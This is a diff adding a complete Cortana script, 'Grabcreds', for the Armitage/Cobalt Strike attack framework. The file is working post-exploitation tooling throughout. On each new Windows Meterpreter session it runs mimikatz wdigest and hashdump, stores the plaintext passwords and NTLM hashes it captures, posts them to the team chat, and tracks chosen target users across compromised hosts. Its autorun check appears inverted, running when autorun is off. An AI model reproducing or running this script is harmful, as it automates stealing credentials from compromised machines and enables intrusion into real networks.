@@ -1,0 +1,348 @@
+
+# Grabcreds v1.0
+#
+# Allows users to run some common post-exploitation commands.
+#
+# Manual commands are also exposed in the Cortana console and
+# descriptions are output on script load.
+#
+#
+# Author: @harmj0y
+#
+#
+
+
+global('@targetusers $autorun');
+@targetusers = @();
+$autorun = 0;
+
+
+###################################################
+#
+# "Main" event triggers
+#
+###################################################
+
+# called on initial script load
+on ready {
+    println("[*]");
+    println("[+] Grabcreds v1.0 Loaded");
+    println("[*]");
+    println("[*] Available commands:");
+    println("[*]");
+    println("[*]    add_users           :   prompt for list of users to hunt for on new hosts");
+    println("[*]    list_users          :   list current users being searched for");
+    println("[*]    reset_users         :   reset the list of users to search for");
+    println("[*]    mimikatz SESSION    :   run mimikatz on a given session and dump creds to the database");
+    println("[*]    run_post SESSION    :   run full post-exploitation on a given session");
+    println("[*]");
+}
+
+# callback function invoked when a new meterpreter session is established
+on session_sync {
+
+    local('$sessionhost @hostsessions ');
+    
+    if (-iswinmeterpreter $1) {
+
+        # get the host IP for this session
+        $sessionhost = session_host($1);
+        
+        # get the sessions for the host
+        @hostsessions = host_sessions($sessionhost);
+        
+        # check if autorun is enabled
+        if ($autorun == 0){
+        
+            # if this is the only session for this host, perform post-exploitation commands
+            if (size(@hostsessions) == 1){
+                # run post-exploitation on a system
+                run_post($1);
+            }
+            
+            # if we're not the only session, don't run anything
+            else{
+                #println("sessions already exist for $sessionhost");
+            }
+        }
+        
+    }
+}
+
+
+###################################################
+#
+# commands to expose to the user interface
+#
+###################################################
+
+command add_users {
+    add_user_file();
+}
+command list_users {
+    local('$user');
+    if (size(@targetusers) == 0) {
+        println("[!] no target users specified");
+    }
+    else{
+        println("[*] Target Users To Search For:");
+        foreach $user (@targetusers){
+            println("   $user");
+        } 
+    }
+}
+command reset_users {
+    clear(@targetusers);
+}
+command mimikatz {
+    run_mimikatz($1);
+}
+command run_post {
+    $sessionhost = session_host($1);
+    run_post($1);
+}
+
+
+###################################################
+#
+# command helper methods
+#
+###################################################
+
+# prompt for a file containing users to search for, then add results to @targetusers
+sub add_user_file {
+    local('$file $handlef');
+    
+    # read in a list of users to hunt for
+    $file = prompt_file_open("User List to Hunt For");
+    
+    if ($file ne ""){
+        $handlef = openf($file);
+        while $readf (readln($handlef)){
+            add(@targetusers, $readf);
+        }
+    }
+}
+
+# popup menu to list target users
+sub popup_list_users {
+    local('$user $text');
+    $text = "";
+    
+    if (size(@targetusers) == 0) {
+        $text = $text . "[!] no target users specified";
+    }
+    else{
+        foreach $user (@targetusers){
+            $text = $text . "$user\n";
+        } 
+    }
+    show_message($text, "Target Users To Search For");
+}
+
+# manually runs mimikatz wdigest on a particular session
+sub run_mimikatz {
+    println("[*] Running mimikatz on ".session_host($1)." session $1");
+    m_cmd($1, "load mimikatz");
+    
+    # bide some time for mimikatz to load
+    m_cmd($1, "sysinfo");
+    m_cmd($1, "sysinfo");
+    m_cmd($1, "sysinfo");
+    m_cmd($1, "sysinfo");
+    
+    m_cmd($1, "wdigest");
+    # meterpreter_wdigest should automatically be invoked
+}
+
+# run a set of post-exploitation modules on a session
+sub run_post{
+    
+    println("[*] Running post-exploitation on ".session_host($1)." session $1");
+
+    # asynchronous meterpreter commands
+    m_cmd($1, "use mimikatz");
+    m_cmd($1, "ps");
+    m_cmd($1, "hashdump");
+    
+    # bide some time for mimikatz to load
+    m_cmd($1, "sysinfo");
+    m_cmd($1, "sysinfo");
+    m_cmd($1, "sysinfo");
+    m_cmd($1, "sysinfo");
+    m_cmd($1, "sysinfo");
+    m_cmd($1, "sysinfo");
+    m_cmd($1, "sysinfo");
+    
+    # run our mimikatz wdigest command
+    m_cmd($1, "wdigest");
+}
+
+
+###################################################
+#
+# custom callbacks for events
+#
+###################################################
+
+# callback for meterpreter> ps
+# searches for any processes owned by anyone in @targetusers
+on meterpreter_ps {
+
+    local ('@processes @foundusers $process $targetuser $name $pid $username');
+    @foundusers = @();
+    @processes = parse_ps($3);
+    
+    foreach $process (@processes) {
+
+        # extract values from the process object
+        ($name, $pid, $username) = values($process, @('Name', 'PID', 'User'));
+        
+        $usernamelc = lc($username);
+        
+        # check if our target users have any processes running
+        foreach $targetuser (@targetusers){
+            if ( find( $usernamelc , lc($targetuser) ) ne $null ){
+                # if the found user isn't already in our list, add it
+                if ( $usernamelc !in @foundusers ){
+                    add(@foundusers, $usernamelc);
+                }
+            }
+        }
+    }
+
+    # get the host for this session
+    $sessionhost = session_host($1);
+    
+    # print out any found users from our target list
+    foreach $founduser (@foundusers){
+        say("[+] Target user \"$founduser\" has a process on $sessionhost");
+        println("[+] Target user \"$founduser\" has a process on $sessionhost");
+    }
+
+}
+
+# callback function invoked on "meterpreter > wdigest"
+# parses mimikatz output and throws everything into the database
+on meterpreter_wdigest {
+
+    local('$sessionhost $authid $package $domain $user $pw $domainuser $output $targetuser');
+    $sessionhost = session_host($1);
+    
+    # awesome function, thanks raffi :)
+    @results = parse_table($3, @("AuthID", "Package", "Domain", "User", "Password"));
+    
+    foreach $result (@results){
+    
+        # if the user password is between 1-32 printable characters, record it
+        if ($result["Password"]  ismatch '^[\w\p{Punct}]{1,32}$' ){
+        
+            $domainuser = $result["Domain"] . "\\\\" . $result["User"];
+            $sessionhost = session_host($1);
+            $pw = $result["Password"];
+            
+            println("[*] Mimikatz $sessionhost session $1 : $domainuser $pw");
+            credential_add(session_host($1), 445, $domainuser, $pw, "wdigest");
+            
+            # accounce to the group chat
+            say("[*] Mimikatz $sessionhost session $1 -> $domainuser $pw");
+            
+            foreach $targetuser (@targetusers){
+                if (lc($targetuser) eq lc($result["User"])){
+                    say("[+] Target user \"$targetuser\" plaintext found on $sessionhost");
+                    println("[+] Target user \"$targetuser\" plaintext found on $sessionhost");
+                }
+            }
+            
+        }
+    }
+}
+
+# callback function invoked on "meterpreter> hashdump"
+# parses hashdump output and throws everything into the database
+on meterpreter_hashdump {
+
+    local('$sessionhost $entry $user $hash $targetuser');
+    $sessionhost = session_host($1);
+    
+    # check if hashdump failed, if so run post/windows/gather/hashdump
+    if (find("Operation failed", $3)){
+        println("[!] hashdump failed on $sessionhost session $1");
+        println("[!] running post/windows/gather/smart_hashdump on $sessionhost $1");
+        launch("post", "windows/gather/smart_hashdump", SESSION => "$1");
+    }
+    
+    foreach $entry (split("\n", $3)) {
+    
+        if ($entry ismatch '(.*?):\d+:(.*?):(.*?):.*') {
+    
+            ($user, $fhash, $lhash) = matched();
+    
+            # build the output format we want
+            $hash = $fhash . ":" . $lhash;
+    
+            # filter out garbage accounts
+            if( $user !ismatch '^ASPNET*|^SUPPORT_.*|^HelpAssistant*|^Guest*'){
+                println("[*] Hashdump $sessionhost session $1 : $user $hash");
+                # add the credentials to the database
+                credential_add(session_host($1), 445, $user, $hash, "smb_hash");
+            
+                foreach $targetuser (@targetusers){
+                    if (lc($targetuser) eq lc($user)){
+                        say("[+] Target user \"$user\" hashes found on $sessionhost");
+                        println("[+] Target user \"$user\" hashes found on $sessionhost");
+                    }
+                }
+                    
+            }
+        }
+    }
+}
+
+
+###################################################
+#
+# Menu modifications
+#
+###################################################
+
+# add in Grabcreds Config options to the main "Cobalt Strike" menu
+popup main_middle {
+
+    menu "Grabcreds" {
+
+        menu "Target Users"{
+            item "add"{
+                add_user_file();
+            }
+            item "list"{
+                popup_list_users();
+            }
+            item "clear"{
+                clear(@targetusers);
+            }
+        }
+        
+        item "Config Autorun" {
+            local('$run');
+            $run = prompt_confirm("Run Grabcreds on new sessions?", "Grabcreds Autorun");
+            $autorun = $run;
+        }
+    }
+}
+
+# add in our custom action options to a host
+popup meterpreter_top {
+    
+    menu "Grabcreds" {
+                
+        item "Full Post-exploitation" {
+            run_post($1);
+        }
+
+        item "Run Mimikatz Only" {
+            run_mimikatz($1);
+        }
+        
+    }
+}
